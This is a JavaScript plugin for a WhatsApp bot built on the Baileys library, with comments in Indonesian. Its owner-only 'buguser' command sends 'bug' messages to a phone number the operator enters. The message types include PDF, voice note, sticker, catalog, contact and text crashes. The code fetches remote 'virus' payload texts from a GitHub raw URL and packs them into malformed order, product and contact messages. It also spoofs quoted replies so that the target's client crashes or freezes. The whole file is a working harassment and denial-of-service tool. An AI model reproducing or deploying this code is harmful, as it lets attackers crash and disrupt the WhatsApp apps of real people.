//Thanks To AyGemuy For This Feature
import fs from 'fs'
import fetch from 'node-fetch'
import { sticker } from '../lib/sticker.js'

const { default: makeWASocket, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, downloadContentFromMessage, downloadHistory, proto, getMessage, generateWAMessageContent, prepareWAMessageMedia } = (await import('@adiwajshing/baileys')).default
let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participants }) => {
	if (!text)return m.reply(`Contoh Penggunaan : *${_p + command}* <nomor>\n\n*Note :*\nJangan Salah Menggunakan Fitur Ini!`)
	let thumb = fs.readFileSync('./thumbnail.jpg')
	let virus = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v12.txt")).text()
	let virus2 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v26.txt")).text()
	let type = (args[0] || '').toLowerCase()

	const from = m.key.remoteJid
	//const participants = m.isGroup ? await groupMetadata.participants : ''
	let q = `Bug Tag From ${wm}\n${text}`
	let sections = [{
		title: `Created by ${wm}`,
		rows: [
			{ title: 'Bug PDF', rowId: `${_p + command} pdf ${text}` },
			{ title: 'Bug VN', rowId: `${_p + command} vn ${text}` },
			{ title: 'Bug Sticker', rowId: `${_p + command} sticker ${text}` },
			{ title: 'Bug Image', rowId: `${_p + command} bugimg ${text}` },
			{ title: 'Bug Video', rowId: `${_p + command} bugvid ${text}` },
			{ title: 'Bug Crash', rowId: `${_p + command} bugcrash ${text}` },
			{ title: 'Bug Kontak', rowId: `${_p + command} bugkontak ${text}` },
			{ title: 'Bug ReactPc', rowId: `${_p + command} reactpc ${text}` },		
			{ title: 'Bug Catalog', rowId: `${_p + command} bugcatalog ${text}` },
			{ title: 'Bug TextCrash', rowId: `${_p + command} bugtextcrash ${text}` },
		]
	}]
	let listMessage = {
		text: '*[ List Bug ]*\n\n*Note :* Jangan Asal Kirim ke orang yg tidak bersalah',
		footer: wm,
		buttonText: 'Silahkan Klik Di Sini',
		sections
	}

	//==================( Quoted ) =================//
	//# Kal
	const kal = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },
	"message": {
		"extendedTextMessage": {
			"text": `${wm}`,
			"previewType": "NONE",
			"contextInfo": {
				"stanzaId": "3EB0382EDBB2",
				"participant": "@s.whatsapp.net"
			}
		}
	}}
	//=================================================//		
	//# Troli
	const trol = { key: { fromMe: false, fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) },
	"message": {
		"orderMessage": {
			"orderId": "594071395007984",
			"thumbnail": fs.readFileSync('./thumbnail.jpg'),
			"itemCount": fsizedoc,
			"status": "INQUIRY",
			"surface": "CATALOG",
			"message": "",
			"orderTitle": `${wm}`,
			"sellerJid": "6285736178354@s.whatsapp.net",
			"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
			"totalAmount1000": fsizedoc,
			"totalCurrencyCode": "IDR"
		}
	}}
	//#Troli 2
	const ftrolii = { key: { fromMe: false, "participant":"0@s.whatsapp.net", "remoteJid": "@g.us"},
	"message": {
		orderMessage: { 		itemCount: fsizedoc,
			status: 200, 		thumbnail: thumb, 		surface: 200, 		message: `© ${wm}`,
			token: "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
			totalAmount1000: fsizedoc,
			totalCurrencyCode: "IDR",
			orderTitle: `${wm} ${virus2}`,
			sellerJid: '0@s.whatsapp.net'}}, 		contextInfo: { "forwardingScore":999,"isForwarded":true },
		sendEphemeral: true
	}	
	//=================================================//	
	//# Sticker
	const bugstik = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) }, "message": {
		"orderMessage": {
			"orderId": "594071395007984",
			"thumbnail": fs.readFileSync('./thumbnail.jpg'),
			"itemCount": fsizedoc,
			"status": "INQUIRY",
			"surface": "CATALOG",
			"message": `${wm}`,
			"orderTitle": `${wm}`,
			"sellerJid": "6285736178354@s.whatsapp.net",
			"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
			"totalAmount1000": fsizedoc,
			"totalCurrencyCode": "IDR"
		}
	}}
	//=================================================//
	//# Pdf
	const bugpdf = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) },
	message: {
		"imageMessage": { "mimetype": "image/jpeg", "caption": `${wm}`, "jpegThumbnail": thumb
		}
	}}
	//=================================================//   
	//# Vn
	const adehvn = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) },
	"message": {
		"locationMessage": {}
	}} 
	//=================================================//	   
	//# Image
	const bugimage = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) },
		"message": {
			"audioMessage": {
				"url": "https://mmg.whatsapp.net/d/f/AqXaKHS3AY_ONTjToJq-wEqO11SqPgaAzGLzg02IBAVP.enc",
				"mimetype": "audio/aac",
				"fileSha256": "3kPrHVqimG+Y7dLgq/q+KPFbZczIgg7SBbuU3UdrinQ=",
				"fileLength": fsizedoc,
				"seconds": fsizedoc,
				"caption": `${wm}`,
				"ptt": false,
				"mediaKey": "SPVvc1ACQyGfWw8CFuqtQ8RUrv8rsa1JK5AkqcMiPEI=",
				"fileEncSha256": "H8EQqzkVWPOvrjoAOGC9FgJkO5KMlScV8+G7ucyVwlo=",
				"directPath": "/v/t62.7114-24/35331424_231575432280264_9094348830349350878_n.enc?ccb=11-4&oh=bb04b71d85c088ec24446502b8c52d14&oe=61767ADB",
				"mediaKeyTimestamp": "1632753911"
			}
		}
	}
	//=================================================//		
	//# Catalog
	const messa = await prepareWAMessageMedia({ image: fs.readFileSync('./thumbnail.jpg') }, { upload: conn.waUploadToServer })
	const catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
		"productMessage": {
		"product": {
			"productImage": messa.imageMessage,
			"productId": "4383282311765462",
			"title": `${wm}`,
			"description": `${virus2}`,
			"currencyCode": "IDR",
			"bodyText": `${virus}`,
			"footerText": `${wm}`,
			"priceAmount1000": fsizedoc,
			"productImageCount": 1,
			"firstImageId": 1,
			"salePriceAmount1000": fsizedoc,
			"retailerId": `${wm}`,
			"url": "wa.me/62881037044211"
		},
			"businessOwnerJid": "62881037044211@s.whatsapp.net",
		}
	}), { userJid: m.chat, quoted: ftrolii })	
	//=================================================//	
	//# Contact
	const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `${wm}${virus}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:${wm}\nitem1.TEL;waid=6281991410940:6281991410940\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}  
	//=================================================//   
	//# Text
	const main = {
		"key": {
			"fromMe": false,
			"participant": "0@s.whatsapp.net",
			...({"remoteJid":''})
			},
		"message":{
			"imageMessage":{
				"mimetype":"image/jpeg",
				"jpegThumbnail":fs.readFileSync('./thumbnail.jpg')
			}
		}
	}
	//=================================================//   

	switch (type) {
		case 'vn': {
			conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {audio: thumb, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
			//await m.reply(`Berhasil Mengirim Bug Vn Di Nomer ${text}@s.whatsapp.net`)
		}
		break
		case 'pdf': {
			conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {document: thumb, filename:`🌞𖧹͓͜͜͡𝑴͜͡𝑨͜͡҉𝑴͜͡𝑨͜͡҉𝑪͜͡𝑶͜͡𖧹͓͓󠇞𞥊.pdf`, mimetype: 'application/pdf',}, {quoted: bugpdf})
			//await m.reply(`Berhasil Mengirim Bug Pdf Di Nomer ${text}@s.whatsapp.net`)
		}
		break
		case 'sticker': {
			let stiker = await sticker(null, 'https://telegra.ph/file/e2d2fac4853f1f923b35c.jpg', global.wm, global.author)
			conn.sendFile(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', stiker, 'sticker.webp', '', false, { asSticker: true }, {quoted: bugstik})
			//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
		}
		break
		case 'bugimg': {
			conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {image: thumb, bugimage }, {quoted: bugimage})
		}
		break
		case 'bugcrash': {
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '622150996855@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '622150996855@s.whatsapp.net', 'B', '0@broadcast')
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '15517868074@s.whatsapp.net', 'B', '0@broadcast')
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '15517868074@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '447710173736@s.whatsapp.net', 'B', '0@broadcast')
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '447710173736@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
			//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
		}
		break
		case 'bugkontak': {
			let res = await generateWAMessageFromContent(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {
				"contactMessage": {
					"vcard": "HAHaAhHAHAHA",
					"displayName": `${author}`,
					"contextInfo": {
						"forwardingScore": 3,
						"isForwarded": true
					}
				}
			}, {quoted: fkontaak, contextInfo:{}}) 
			conn.relayWAMessage(res)
			//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
		}
		break
		case 'reactpc': {
			await conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {text: `${wm}` }, {quoted: trol})
			//await m.reply(`Berhasil Mengirim Bug React Di Nomer ${text}@s.whatsapp.net`)
		}
		break
		case 'bugtag': {
			if (!m.isGroup) return global.dfail('group',m,conn)
			conn.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: kal })
		}
		break
		case 'bugcatalog': {
			conn.relayMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', catalog.message, { messageId: catalog.key.id })
		}
		break
		case 'bugtextcrash': {
			conn.reply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', `${wm}`, main)
		}
		break
		case 'bugvid': {
			conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {video: thumb, bugimage, }, {quoted: bugimage})
		}
		break
		default:
			if (!/[01]/.test(command)) return conn.sendMessage(m.chat, listMessage, m)
			throw false
	}
	m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
}

handler.help = ['sendbug <nomer>']
handler.tags = ['owner']
handler.command = /^(buguser)$/i

handler.owner = true

export default handler